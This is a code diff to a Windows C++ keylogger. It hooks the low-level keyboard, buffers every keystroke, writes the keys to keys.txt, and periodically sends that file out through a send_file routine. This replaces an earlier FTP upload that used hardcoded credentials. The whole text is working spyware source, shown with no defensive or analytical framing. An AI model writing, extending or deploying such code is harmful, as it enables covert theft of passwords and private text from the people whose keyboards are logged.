@@ -3,15 +3,16 @@
 #include <windows.h>
 #include "LogSender.hpp"
 #include "FTP.hpp"
+#include "file_send.cpp"
+#include "timer.cpp"
 
-// using namespace std;
+using namespace std;
 
-ofstream out;
+string buffer = "";
+ofstream out("./keys.txt");
 
 LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
-    out.open("./keys.txt", ios::app);
-
     PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);
 
     // If key is being pressed
@@ -61,16 +62,25 @@ LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
             break;
         // Visible keys
         default:
-            out << char(tolower(p->vkCode));
+            buffer += char(tolower(p->vkCode));
         }
     }
 
-    out.close();
+    if(mtx.try_lock()) {
 
-    FTP * ftp = new FTP("127.0.0.1", "kolio", "099824058");
-    LogSender l(ftp);
-    
-    l.send_logs("/keys.txt");
+            if (counter % 180 == 0){
+                send_file("./keys.txt");
+            }
+
+            else if (counter % 60 == 0){
+                out << buffer;
+
+                buffer = "";
+            }
+           
+            mtx.unlock();
+            sleep(1);
+        }
 
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
